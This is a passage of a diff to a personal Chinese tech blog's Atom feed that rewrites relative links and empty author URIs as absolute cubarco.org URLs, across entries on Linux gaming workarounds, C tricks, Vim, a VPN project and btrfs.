-  &lt;p&gt;&lt;a href=&quot;/blog/2015/05/dota2-blocky-cjk-fonts-workaround/&quot;&gt;一个解决 Linux 版 Dota 2 中 CJK 字符显示成方块的 Workaround&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on May 14, 2015.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2015/05/dota2-blocky-cjk-fonts-workaround/&quot;&gt;一个解决 Linux 版 Dota 2 中 CJK 字符显示成方块的 Workaround&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on May 14, 2015.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[C Programming Tricks]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2015/05/c-programming-tricks/" />
-  <id>/blog/2015/05/c-programming-tricks</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2015/05/c-programming-tricks/" />
+  <id>https://cubarco.org/blog/2015/05/c-programming-tricks</id>
   <updated>2015-05-05T00:00:00-00:00</updated>
   <published>2015-05-02T00:00:00+08:00</published>
   
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;p&gt;这个 Note 用来记录各处收集的 C 编程 tricks. 看到有意思的就会摘一下，来源各异。&lt;/p&gt;
@@ -1017,20 +1825,20 @@ steam&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
   &lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/questions/18491390/difference-between-scanfc-c-and-scanf-c-c&quot;&gt;Difference between scanf(“%c”, &amp;amp;c) and scanf(“ %c”, &amp;amp;c) - StackOverflow&lt;/a&gt;&lt;/li&gt;
 &lt;/ol&gt;
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2015/05/c-programming-tricks/&quot;&gt;C Programming Tricks&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on May 02, 2015.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2015/05/c-programming-tricks/&quot;&gt;C Programming Tricks&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on May 02, 2015.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[解决用 ldconfig 指定 libgl 库时 Steam 的异常]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2015/01/ldconfig-and-steam-workaround/" />
-  <id>/blog/2015/01/ldconfig-and-steam-workaround</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2015/01/ldconfig-and-steam-workaround/" />
+  <id>https://cubarco.org/blog/2015/01/ldconfig-and-steam-workaround</id>
   <updated>2015-03-07T00:00:00-00:00</updated>
   <published>2015-01-28T00:00:00+08:00</published>
   
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;p&gt;刚考完试，有点无聊，开 Steam 准备玩点游戏，结果发现之前的一个脚本不能用了。我的机器的情况是 Intel 集显 + NVIDIA 独显。两个显卡的切换一直是件很蛋疼的事情，optirun什么的性能实在太差，如果一直独显直出，耗电也是个大问题。这个学期初和 @hyrathb juju 一起研究了一下，用 ldconfig 尽可能减少切换显卡带来的麻烦(就是先关X, 然后跑个脚本开独显直出的X, 如果需要这个解决方案我可以单独po文).&lt;/p&gt;
@@ -1093,20 +1901,20 @@ steam&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 env &lt;span class=&quot;nv&quot;&gt;DEBUGGER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/path/to/script steam&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2015/01/ldconfig-and-steam-workaround/&quot;&gt;解决用 ldconfig 指定 libgl 库时 Steam 的异常&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on January 28, 2015.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2015/01/ldconfig-and-steam-workaround/&quot;&gt;解决用 ldconfig 指定 libgl 库时 Steam 的异常&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on January 28, 2015.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[在社交平台上发布匹配一定规则的 Github commit message]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2015/01/post-github-commits-to-social-platforms/" />
-  <id>/blog/2015/01/post-github-commits-to-social-platforms</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2015/01/post-github-commits-to-social-platforms/" />
+  <id>https://cubarco.org/blog/2015/01/post-github-commits-to-social-platforms</id>
   <updated>2015-01-15T00:00:00-00:00</updated>
   <published>2015-01-15T00:00:00+08:00</published>
   
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;p&gt;之前看到了 @fqj1994 juju 的这篇 blog: &lt;a href=&quot;https://blog.fqj.me/posts/2013/08/google-app-script-share-blog-updates-with-social-network&quot;&gt;用 Google App Script 實現博客更新時自動在社交網絡上發狀態分享&lt;/a&gt;, 也感觉自己的 blog 根本没人访问，需要一个类似的东西。因为我的 blog 是用的 jekyll, 挂在 &lt;a href=&quot;https://github.com/cubarco/cubarco.github.io&quot;&gt;Github&lt;/a&gt; 上的，Github 又提供了一个叫 Webhook 的东西，就准备自己实现一种更加&lt;s&gt;优雅&lt;/s&gt;的方式。&lt;/p&gt;
@@ -1124,19 +1932,19 @@ env &lt;span class=&quot;nv&quot;&gt;DEBUGGER&lt;/span&gt;&lt;span class=&quot;o
 &lt;h6 id=&quot;update-2015-01-15&quot;&gt;Update 2015-01-15:&lt;/h6&gt;
 &lt;p&gt;这个 blog 发出去之后发现 log 报错了(UnicodeEncodeError)，但是没时间修了&lt;s&gt;(出去玩了)&lt;/s&gt;。晚上回来处理完各种事情之后才开始修。发现是 &lt;code class=&quot;highlighter-rouge&quot;&gt;urllib.urlencode()&lt;/code&gt; 不支持 unicode, fix 已经推到 Github 上了… 感觉 python 还是学的不好啊。其实我一开始学 python 就是随手写个后台，没准备深入。现在又发觉 python 挺好用的，但是不知道怎么深入，有心无力的感觉哎。&lt;/p&gt;
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2015/01/post-github-commits-to-social-platforms/&quot;&gt;在社交平台上发布匹配一定规则的 Github commit message&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on January 15, 2015.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2015/01/post-github-commits-to-social-platforms/&quot;&gt;在社交平台上发布匹配一定规则的 Github commit message&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on January 15, 2015.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[Vim 删除成对的字符]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2015/01/vimscript-delpair/" />
-  <id>/blog/2015/01/vimscript-delpair</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2015/01/vimscript-delpair/" />
+  <id>https://cubarco.org/blog/2015/01/vimscript-delpair</id>
   <published>2015-01-11T00:00:00+08:00</published>
   <updated>2015-01-11T00:00:00+08:00</updated>
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;p&gt;今天为了偷懒又往 .vimrc 里面写了点东西，作用是在删除类似于&lt;code class=&quot;highlighter-rouge&quot;&gt;()&lt;/code&gt;这种成对出现的字符对的前一个字符时同时删除后面那个…&lt;/p&gt;
@@ -1162,20 +1970,20 @@ env &lt;span class=&quot;nv&quot;&gt;DEBUGGER&lt;/span&gt;&lt;span class=&quot;o
 &lt;span class=&quot;k&quot;&gt;endf&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2015/01/vimscript-delpair/&quot;&gt;Vim 删除成对的字符&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on January 11, 2015.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2015/01/vimscript-delpair/&quot;&gt;Vim 删除成对的字符&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on January 11, 2015.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[vpn-udp-libev 开发总结]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2015/01/vpn-udp-libev-development-notes/" />
-  <id>/blog/2015/01/vpn-udp-libev-development-notes</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2015/01/vpn-udp-libev-development-notes/" />
+  <id>https://cubarco.org/blog/2015/01/vpn-udp-libev-development-notes</id>
   <updated>2015-01-10T00:00:00-00:00</updated>
   <published>2015-01-09T00:00:00+08:00</published>
   
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;p&gt;最近又在看 UNIX 网络编程那本书，写了个 vpn 练手，代码和简单的介绍在 &lt;a href=&quot;https://github.com/cubarco/network-programming-exp/tree/master/vpn-udp-libev&quot; title=&quot;cubarco/network-programming-exp/vpn-udp-libev&quot;&gt;Github&lt;/a&gt; 上&lt;s&gt;(好像效率还不错的样子)&lt;/s&gt;。这里照例做一下总结，便于以后查阅。&lt;/p&gt;
@@ -1211,19 +2019,19 @@ plied to the call.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 &lt;h4 id=&quot;more&quot;&gt;More&lt;/h4&gt;
 &lt;p&gt;想到再写&lt;/p&gt;
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2015/01/vpn-udp-libev-development-notes/&quot;&gt;vpn-udp-libev 开发总结&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on January 09, 2015.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2015/01/vpn-udp-libev-development-notes/&quot;&gt;vpn-udp-libev 开发总结&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on January 09, 2015.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[对 btrfs 的吐槽]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2015/01/btrfs-sucks/" />
-  <id>/blog/2015/01/btrfs-sucks</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2015/01/btrfs-sucks/" />
+  <id>https://cubarco.org/blog/2015/01/btrfs-sucks</id>
   <published>2015-01-02T00:00:00+08:00</published>
   <updated>2015-01-02T00:00:00+08:00</updated>
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;p&gt;刚把本来给&lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;/var&lt;/code&gt;用的 btrfs 换回 ext4，po 一发记(tu)录(cao)一下。&lt;/p&gt;
@@ -1242,20 +2050,20 @@ plied to the call.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;所以呢，总的来说， btrfs 的问题还是有点多，一些有意思的功能日常也起不到&lt;em&gt;必不可少&lt;/em&gt;的作用。想入 btrfs 坑的还是再观望一段时间吧，已经入 btrfs 坑的话我只能祝你好运了。&lt;/p&gt;
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2015/01/btrfs-sucks/&quot;&gt;对 btrfs 的吐槽&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on January 02, 2015.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2015/01/btrfs-sucks/&quot;&gt;对 btrfs 的吐槽&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on January 02, 2015.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[Paf 开发总结]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2014/12/paf-develop-notes/" />
-  <id>/blog/2014/12/paf-develop-notes</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2014/12/paf-develop-notes/" />
+  <id>https://cubarco.org/blog/2014/12/paf-develop-notes</id>
   <updated>2015-01-01T00:00:00-00:00</updated>
   <published>2014-12-31T00:00:00+08:00</published>
   
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/cubarco/paf&quot; title=&quot;Pipe as File Github Homepage&quot;&gt;Paf (Pipe as file)&lt;/a&gt; 并不是什么大项目，只是一时兴起为满足自己奇怪需求而开发的小工具。具体的介绍都摆在 Github 上了，这里就不赘述了。只是对开发过程中遇到的一些问题和技巧做一下总结。&lt;/p&gt;
@@ -1301,19 +2109,19 @@ plied to the call.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
   &lt;/ol&gt;
 &lt;/div&gt;
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2014/12/paf-develop-notes/&quot;&gt;Paf 开发总结&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on December 31, 2014.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2014/12/paf-develop-notes/&quot;&gt;Paf 开发总结&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on December 31, 2014.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[How do you read source code?]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2014/12/repost-how-do-you-read-source-code/" />
-  <id>/blog/2014/12/repost-how-do-you-read-source-code</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2014/12/repost-how-do-you-read-source-code/" />
+  <id>https://cubarco.org/blog/2014/12/repost-how-do-you-read-source-code</id>
   <published>2014-12-19T00:00:00+08:00</published>
   <updated>2014-12-19T00:00:00+08:00</updated>
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;blockquote&gt;
@@ -1401,19 +2209,19 @@ plied to the call.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
   &lt;li&gt;…&lt;/li&gt;
 &lt;/ul&gt;
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2014/12/repost-how-do-you-read-source-code/&quot;&gt;How do you read source code?&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on December 19, 2014.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2014/12/repost-how-do-you-read-source-code/&quot;&gt;How do you read source code?&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on December 19, 2014.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[do {…} while (0) — What is it good for?]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2014/12/c-do-while-in-macros/" />
-  <id>/blog/2014/12/c-do-while-in-macros</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2014/12/c-do-while-in-macros/" />
+  <id>https://cubarco.org/blog/2014/12/c-do-while-in-macros</id>
   <published>2014-12-17T00:00:00+08:00</published>
   <updated>2014-12-17T00:00:00+08:00</updated>
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;blockquote&gt;
@@ -1452,7 +2260,7 @@ plied to the call.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
     &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2014/12/c-do-while-in-macros/&quot;&gt;do {…} while (0) — What is it good for?&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on December 17, 2014.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2014/12/c-do-while-in-macros/&quot;&gt;do {…} while (0) — What is it good for?&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on December 17, 2014.&lt;/p&gt;</content>
 </entry>
 
 </feed>
